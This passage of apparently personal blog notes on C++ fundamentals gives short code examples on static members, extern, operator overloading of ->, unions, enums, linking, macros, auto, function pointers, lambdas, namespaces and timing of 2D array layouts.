class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Entity::x;</span><br><span class="line"><span class="type">int</span> Entity::y;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Entity e;</span><br><span class="line">Entity::x = <span class="number">2</span>;               <span class="comment">//e.x = 2;</span></span><br><span class="line">Entity::y = <span class="number">3</span>;               <span class="comment">//e.y = 3;</span></span><br><span class="line"></span><br><span class="line">Entity e1;</span><br><span class="line">Entity::x = <span class="number">5</span>;                <span class="comment">//e1.x = 5;</span></span><br><span class="line">Entity::y = <span class="number">8</span>;                <span class="comment">//e1.y = 8;</span></span><br><span class="line"></span><br><span class="line">Entity::<span class="built_in">Print</span>();              <span class="comment">//e.Print();</span></span><br><span class="line">Entity::<span class="built_in">Print</span>();              <span class="comment">//e1.Print();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>Requires the variable to survive the function exit: Use static to decorate a local variable.</p></li><li><p>You need to scope the variable to the current file: static decorates a global variable.</p></li><li><p>Member variables/functions need to be called in case of shared variables or functions: static modifies member variables/functions.</p></li></ul><h3 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h3><ul><li>extern can be used to decorate a variable or function when you need to import a non-static variable or function from an external file.</li></ul><h3 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector3</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">double</span> x, y, z;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> offset = (<span class="type">int</span>)&amp;((Vector3*)<span class="number">0</span>)-&gt;z;<span class="comment">//0+16</span></span><br><span class="line">std::cout &lt;&lt; offset &lt;&lt; std::endl;<span class="comment">//16</span></span><br><span class="line"> offset = (<span class="type">int</span>)&amp;((Vector3*)<span class="number">1000</span>)-&gt;z;<span class="comment">//1000+16</span></span><br><span class="line">std::cout &lt;&lt; offset &lt;&lt; std::endl;<span class="comment">//1016</span></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> <span class="type">const</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScopedPtr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">Entity* m_obj;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">ScopedPtr</span>(Entity* entity)</span><br><span class="line">:<span class="built_in">m_obj</span>(entity)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">ScopedPtr</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_obj;</span><br><span class="line">&#125;</span><br><span class="line">Entity* <span class="keyword">operator</span>-&gt;()<span class="comment">//overload -&gt;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> Entity* <span class="keyword">operator</span>-&gt;() <span class="type">const</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">ScopedPtr e = <span class="keyword">new</span> Entity;</span><br><span class="line">e-&gt;<span class="built_in">Print</span>();<span class="comment">//different class</span></span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> print(x,y) std::cout&lt;&lt; x &lt;&lt; <span class="string">&quot;:   &quot;</span>&lt;&lt; y &lt;&lt; std::endl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">vector2</span> &#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">vector4</span> &#123;</span><br><span class="line"><span class="keyword">union</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">int</span> a, b, c, d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">vector2 A, B;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vector4 vector&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vector.A.a&quot;</span>, vector.A.a);</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vector.b&quot;</span>, vector.A.b);</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vector.B.a&quot;</span>, vector.B.a);</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vector.d&quot;</span>, vector.d);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//vector.A.a:   1</span></span><br><span class="line"><span class="comment">//vector.b:   2</span></span><br><span class="line"><span class="comment">//vector.B.a:   3</span></span><br><span class="line"><span class="comment">//vector.d:   4</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Example</span> :   <span class="type">unsigned</span> <span class="type">char</span> <span class="comment">//typem, must be interger</span></span><br><span class="line">&#123;</span><br><span class="line">A = <span class="number">5</span>, B, C       <span class="comment">//B = 6, C = 7</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Example value = B;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (value == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linking"><a href="#linking" class="headerlink" title="linking"></a>linking</h3><p>static linking &amp;&amp; dynamic linking</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#include &quot;GLFW/glfw3.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">glfwInit</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//在C++中，函数名会被编译器修饰（或称为名称修饰），以便支持函数重载等特性。但是在C语言中，函数名不会被修饰。extern &quot;C&quot;的作用是告诉编译器，函数的名称应该按照C语言的规则处理，即不进行名称修饰。</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="built_in">glfwInit</span>();</span><br><span class="line">std::cout &lt;&lt; a&lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://learn.microsoft.com/en-us/cpp/build/importing-into-an-application-using-declspec-dllimport?redirectedfrom=MSDN&amp;view=msvc-160">使用 __declspec（dllimport） 导入到应用程序中 |Microsoft学习</a></p><p>//TODO</p><h3 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h3><p>//TODO</p><h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><p>//TODO</p><h3 id="macro"><a href="#macro" class="headerlink" title="macro"></a>macro</h3><ul><li>Can be used to manage release and Debug versions</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PR_DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Edition() std::cout &lt;&lt; <span class="string">&quot;Debug&quot;</span> &lt;&lt; std::endl</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(PR_RELEASE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Edition() std::cout &lt;&lt; <span class="string">&quot;Release&quot;</span> &lt;&lt; std::endl</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line"><span class="built_in">function</span>();</span><br><span class="line"><span class="comment">// Using 0 to control this function will not compile.</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN int main() &#123;\</span></span><br><span class="line"><span class="meta">Edition();\</span></span><br><span class="line"><span class="meta">std::cin.get();\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line">MAIN<span class="comment">//main function</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//different output in different modes.</span></span><br></pre></td></tr></table></figure><h3 id="auto"><a href="#auto" class="headerlink" title="auto"></a>auto</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="comment">//unordered_map has less runtime than map, but it requires more space to maintain the hash.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Device</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DevieManager</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">std::unordered_map&lt;std::string, std::vector&lt;Device*&gt;&gt; m_Devices;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">const</span> std::unordered_map&lt;std::string, std::vector&lt;Device*&gt;&gt;&amp; <span class="built_in">GetDevices</span>() <span class="type">const</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_Devices;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::vector&lt;std::string&gt; strings;</span><br><span class="line">strings.<span class="built_in">push_back</span>(<span class="string">&quot;Randolfluo&quot;</span>);</span><br><span class="line">strings.<span class="built_in">push_back</span>(<span class="string">&quot;114514&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = strings.<span class="built_in">begin</span>(); it != strings.<span class="built_in">end</span>(); it++)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; *it &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">DevieManager dm;</span><br><span class="line"><span class="type">const</span> <span class="keyword">auto</span>&amp; devices = dm.<span class="built_in">GetDevices</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="function-pointer"><a href="#function-pointer" class="headerlink" title="function pointer"></a>function pointer</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">forEach</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; values, <span class="type">void</span>(*func)(<span class="type">int</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> value : values)</span><br><span class="line"><span class="built_in">func</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;<span class="comment">//initializer lists</span></span><br><span class="line">forEach(values, Print);</span><br><span class="line"><span class="keyword">auto</span> fun = Print; <span class="comment">//void(*fun)(int x)//function pointer </span></span><br><span class="line"><span class="built_in">fun</span>(<span class="number">114514</span>);</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><ul><li><p>Lambdas allow us to define the methods of a function without the need for a function definition</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">forEach</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; values, <span class="type">const</span> std::function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt;&amp; func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> value : values)</span><br><span class="line"><span class="built_in">func</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">auto</span> it = std::<span class="built_in">find_if</span>(values.<span class="built_in">begin</span>(), values.<span class="built_in">end</span>(), [](<span class="type">int</span> value) &#123;<span class="keyword">return</span> value &gt; <span class="number">3</span>; &#125;);</span><br><span class="line"><span class="built_in">Print</span>(*it);</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> lambda = [=](<span class="type">int</span> value) &#123; std::cout &lt;&lt; value &lt;&lt; std::endl; &#125;;</span><br><span class="line">forEach(values, lambda);</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><ul><li><p>Namespaces can be used as additional information to distinguish functions, classes, variables, and so on with the same name from different libraries.</p></li><li><p>Use it in the smallest scope possible.</p></li><li>Make sure there are no conflicts with other namespaces</li><li>Never use in header files</li></ul><h3 id="multidimensional-array"><a href="#multidimensional-array" class="headerlink" title="multidimensional array"></a>multidimensional array</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">30000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Timer</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span>* m_Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">std::chrono::time_point &lt; std::chrono::steady_clock&gt; start,end;</span><br><span class="line">std::chrono::duration&lt;<span class="type">float</span>&gt; duration ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Timer</span>()</span><br><span class="line">:<span class="built_in">m_Name</span>(<span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">start = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Timer</span>(<span class="type">const</span> <span class="type">char</span>* name)</span><br><span class="line">:<span class="built_in">m_Name</span>(name)</span><br><span class="line">&#123;</span><br><span class="line">start = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">Timer</span>()</span><br><span class="line">&#123;</span><br><span class="line">end = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">duration = end - start;</span><br><span class="line"><span class="keyword">auto</span> duration1 = std::chrono::<span class="built_in">duration_cast</span>&lt;std::chrono::milliseconds&gt;(end - start);</span><br><span class="line">std::cout &lt;&lt; m_Name&lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; duration1 &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">array2d_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Timer <span class="title">time</span><span class="params">(<span class="string">&quot;array2d_1&quot;</span>)</span></span>;</span><br><span class="line"><span class="type">int</span>** a2d = <span class="keyword">new</span> <span class="type">int</span>* [N];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">a2d[i] = <span class="keyword">new</span> <span class="type">int</span>[N];</span><br><span class="line"><span class="comment">//memory fragmentation</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">a2d[i][j] = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="keyword">delete</span>[] a2d[i];</span><br><span class="line"><span class="keyword">delete</span>[] a2d;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">array2d_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Timer <span class="title">time</span><span class="params">(<span class="string">&quot;array2d_2&quot;</span>)</span></span>;</span><br><span class="line"><span class="type">int</span>* array = <span class="keyword">new</span> <span class="type">int</span>[N * N];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">array[i*N+j] = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>[] array;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">array2d_1</span>();</span><br><span class="line"><span 